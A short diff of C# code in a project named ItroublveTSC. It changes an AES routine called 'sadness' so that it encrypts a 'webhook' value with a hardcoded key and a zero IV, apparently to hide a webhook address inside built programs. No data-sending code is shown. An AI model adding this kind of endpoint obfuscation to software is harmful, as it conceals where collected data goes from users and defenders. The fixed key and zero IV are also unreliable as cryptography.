@@ -557,20 +557,20 @@ namespace ItroublveTSC
         }
         #endregion
         #region Encryption
-        public static byte[] sadness(byte[] message)
+        public static byte[] sadness(byte[] enc_webhook)
         {
             try
             {
                 Aes aes = new AesManaged
                 {
-                    Key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F },
+                    Key = new byte[] { 88, 105, 179, 95, 179, 135, 116, 246, 101, 235, 150, 231, 111, 77, 22, 131 },
                     IV = new byte[16],
                     Mode = CipherMode.CBC,
                     Padding = PaddingMode.Zeros
                 };
                 ICryptoTransform crypto;
                 crypto = aes.CreateEncryptor();
-                return crypto.TransformFinalBlock(message, 0, message.Length); //return encrypted value
+                return crypto.TransformFinalBlock(enc_webhook, 0, enc_webhook.Length);
             }
             catch (Exception x)
             {
